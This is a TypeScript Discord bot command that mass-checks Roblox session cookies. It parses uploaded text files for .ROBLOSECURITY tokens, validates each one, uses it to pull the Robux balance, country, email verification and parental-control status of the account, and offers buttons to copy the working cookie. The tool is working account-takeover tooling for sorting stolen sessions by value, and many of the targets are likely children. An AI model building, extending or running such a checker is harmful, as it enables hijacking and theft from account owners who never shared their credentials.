import {
  SlashCommandBuilder,
  PermissionFlagsBits,
  ActionRowBuilder,
  ButtonBuilder,
  ButtonStyle,
  EmbedBuilder,
  type ChatInputCommandInteraction,
} from 'discord.js';
import axios from 'axios';
import { validateCookie } from '../roblox';
import { logger } from '../../lib/logger';
import type { Command } from './types';

const store = new Map<string, string>();

function buildCheckButtons(id: string): ActionRowBuilder<ButtonBuilder> {
  return new ActionRowBuilder<ButtonBuilder>().addComponents(
    new ButtonBuilder()
      .setCustomId(`check_copypc_${id}`)
      .setLabel('💻 Copy PC')
      .setStyle(ButtonStyle.Secondary),
    new ButtonBuilder()
      .setCustomId(`check_copymob_${id}`)
      .setLabel('📱 Copy Mobile')
      .setStyle(ButtonStyle.Secondary),
  );
}

interface RobuxResponse { robux: number }
interface EmailResponse { verifiedEmail: string | null; pendingEmail: string | null }
interface ParentalResponse { parents: unknown[]; canAddParent: boolean }
interface CountryResponse { value: { countryName: string } }

const FULL_COOKIE_RE = /_\|WARNING:-DO-NOT-SHARE-THIS\.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items\.\|_CAEQ[A-Za-z0-9._\-+=\/]+/g;
const BARE_COOKIE_RE = /CAEQ[A-Za-z0-9._\-+=\/]{50,}/g;

function extractCookies(text: string): string[] {
  const fullMatches = [...text.matchAll(FULL_COOKIE_RE)].map((m) => m[0]);
  const fullBareValues = new Set(fullMatches.map((m) => m.slice(m.indexOf('|_CAEQ') + 2)));
  const bareMatches = [...text.matchAll(BARE_COOKIE_RE)]
    .map((m) => m[0])
    .filter((v) => !fullBareValues.has(v));
  const seen = new Set<string>();
  const result: string[] = [];
  for (const full of fullMatches) {
    const bare = full.slice(full.indexOf('|_CAEQ') + 2);
    if (!seen.has(bare)) { seen.add(bare); result.push(full); }
  }
  for (const bare of bareMatches) {
    if (!seen.has(bare)) { seen.add(bare); result.push(bare); }
  }
  return result;
}

async function fetchRobux(cookie: string, userId: string): Promise<number> {
  try {
    const resp = await axios.get<RobuxResponse>(
      `https://economy.roblox.com/v1/users/${userId}/currency`,
      { headers: { Cookie: `.ROBLOSECURITY=${cookie}` }, validateStatus: () => true, timeout: 10000 }
    );
    if (resp.status === 200 && resp.data) return resp.data.robux || 0;
  } catch (err) { logger.error({ err }, 'fetchRobux check'); }
  return 0;
}

async function fetchCountry(cookie: string): Promise<string> {
  try {
    const resp = await fetch('https://accountsettings.roblox.com/v1/account/settings/account-country', {
      headers: { Cookie: `.ROBLOSECURITY=${cookie}` },
    });
    if (resp.status === 200) {
      const data = (await resp.json()) as CountryResponse;
      return data.value?.countryName || 'Unknown';
    }
  } catch (err) { logger.error({ err }, 'fetchCountry check'); }
  return 'Unknown';
}

async function fetchEmailInfo(cookie: string): Promise<{ verified: string | null; pending: string | null }> {
  try {
    const resp = await fetch('https://accountsettings.roblox.com/v1/emails', {
      headers: { Cookie: `.ROBLOSECURITY=${cookie}` },
    });
    if (resp.status === 200) {
      const data = (await resp.json()) as EmailResponse;
      return { verified: data.verifiedEmail || null, pending: data.pendingEmail || null };
    }
  } catch (err) { logger.error({ err }, 'fetchEmailInfo check'); }
  return { verified: null, pending: null };
}

async function fetchParentalControls(cookie: string): Promise<{ hasParent: boolean }> {
  try {
    const resp = await fetch('https://apis.roblox.com/parental-controls-api/v1/parental-controls/get-linked-parents', {
      headers: { Cookie: `.ROBLOSECURITY=${cookie}` },
    });
    if (resp.status === 200) {
      const data = (await resp.json()) as ParentalResponse;
      return { hasParent: (data.parents && data.parents.length > 0) || false };
    }
  } catch (err) { logger.error({ err }, 'fetchParentalControls check'); }
  return { hasParent: false };
}

const data = new SlashCommandBuilder()
  .setName('check')
  .setDescription('Mass Checking File')
  .setDefaultMemberPermissions(PermissionFlagsBits.Administrator)
  .addAttachmentOption((opt) =>
    opt.setName('file')
      .setDescription('A .txt file containing cookies')
      .setRequired(true),
  ) as SlashCommandBuilder;

async function execute(interaction: ChatInputCommandInteraction): Promise<void> {
  try {
    await interaction.deferReply({ ephemeral: true });

    const timestamp = new Date().toLocaleString();
    const footerData = {
      text: `${interaction.user.username} | ${timestamp}`,
      iconURL: interaction.user.displayAvatarURL(),
    };

    const attachment = interaction.options.getAttachment('file', true);
    if (!attachment.name?.endsWith('.txt') && !attachment.contentType?.includes('text')) {
      const embed = new EmbedBuilder()
        .setTitle('𖣐 Invalid File')
        .setColor('#FFFFFF')
        .setDescription('✧ **Error**\n────\n⭑ Please attach a `.txt` file.')
        .setFooter(footerData);
      await interaction.editReply({ embeds: [embed] });
      return;
    }

    let fileContent: string;
    try {
      const resp = await axios.get<string>(attachment.url, { responseType: 'text', validateStatus: () => true });
      fileContent = resp.data;
    } catch (err: any) {
      logger.error({ err }, 'File download failed in check');
      const embed = new EmbedBuilder()
        .setTitle('𖣐 Failed!')
        .setColor('#FFFFFF')
        .setDescription('✧ **Error**\n────\n⭑ Could not fetch the file. Please try again.')
        .setFooter(footerData);
      await interaction.editReply({ embeds: [embed] });
      return;
    }

    const cookies = extractCookies(fileContent);
    if (cookies.length === 0) {
      const embed = new EmbedBuilder()
        .setTitle('𖣐 No Cookies Found')
        .setColor('#FFFFFF')
        .setDescription('✧ **Error**\n────\n⭑ File must contain `_|WARNING...|_CAEQ…` or bare `CAEQ…` tokens.')
        .setFooter(footerData);
      await interaction.editReply({ embeds: [embed] });
      return;
    }

    const progressEmbed = new EmbedBuilder()
      .setTitle('𖣐 Processing .ᐟ')
      .setColor('#FFFFFF')
      .setDescription(`✧ **Status:** Scanning ${cookies.length} cookie(s)...\n────\n⭑ Validating each and fetching details.`)
      .setFooter(footerData);
    await interaction.editReply({ embeds: [progressEmbed] });

    let validCount = 0;
    let totalRobux = 0;

    for (let i = 0; i < cookies.length; i++) {
      const rawCookie = cookies[i];
      const validation = await validateCookie(rawCookie, 3);
      if (!validation.valid) continue;

      validCount++;
      const { userId, username, displayName } = validation;
      const [robux, country, email, parental] = await Promise.all([
        fetchRobux(rawCookie, String(userId)),
        fetchCountry(rawCookie),
        fetchEmailInfo(rawCookie),
        fetchParentalControls(rawCookie),
      ]);

      totalRobux += robux;

      let emailStatus = 'No email';
      if (email.verified) emailStatus = '✅ Verified';
      else if (email.pending) emailStatus = '⏳ Pending';

      const id = Math.random().toString(36).slice(2, 10);
      store.set(id, rawCookie);
      setTimeout(() => store.delete(id), 300000);

      const row = buildCheckButtons(id);

      const embed = new EmbedBuilder()
        .setTitle(`𖣐 Valid Cookie #${validCount}`)
        .setColor('#FFFFFF')
        .setDescription(
          `✧ **User**\n` +
          `────\n` +
          `⭑ **Username:** ${username}\n` +
          `⭑ **Display:** ${displayName || username}\n` +
          `⭑ **User ID:** ${userId}\n` +
          `⭑ **Country:** ${country}\n` +
          `💰 **Robux:** ${robux.toLocaleString()} ₽\n` +
          `────\n` +
          `✧ **Account Details**\n` +
          `────\n` +
          `⭑ **Email:** ${emailStatus}\n` +
          `⭑ **Parental Controls:** ${parental.hasParent ? '✅ Linked' : '❌ None'}\n` +
          `────\n` +
          `⭑ Your credentials were not logged.`
        )
        .setFooter(footerData);
      await interaction.followUp({ embeds: [embed], components: [row], ephemeral: true });
    }

    const summaryEmbed = new EmbedBuilder()
      .setTitle(validCount === 0 ? '𖣐 No Valid Cookies' : '𖣐 Scan Complete .ᐟ')
      .setColor('#FFFFFF')
      .setDescription(
        validCount === 0
          ? `✧ **Results**\n────\n⭑ Checked ${cookies.length} cookie(s)\n⭑ **Valid:** 0\n⭑ All are invalid or expired.`
          : `✧ **Results**\n────\n⭑ Checked ${cookies.length} cookie(s)\n⭑ **Valid:** ${validCount}\n⭑ **Total Robux:** ${totalRobux.toLocaleString()} ₽`
      )
      .setImage('https://files.catbox.moe/955g15.gif')
      .setFooter(footerData);
    await interaction.followUp({ embeds: [summaryEmbed], ephemeral: true });
  } catch (error: any) {
    logger.error({ err: error, userId: interaction.user.id }, 'Check command error');
    const embed = new EmbedBuilder()
      .setTitle('𖣐 Failed!')
      .setColor('#FFFFFF')
      .setDescription('✧ **Unexpected Error**\n────\n⭑ Something went wrong. Please try again later.')
      .setFooter({
        text: `${interaction.user.username} | ${new Date().toLocaleString()}`,
        iconURL: interaction.user.displayAvatarURL(),
      });
    await interaction.editReply({ embeds: [embed] });
  }
}

export const checkCommand: Command = { data, execute };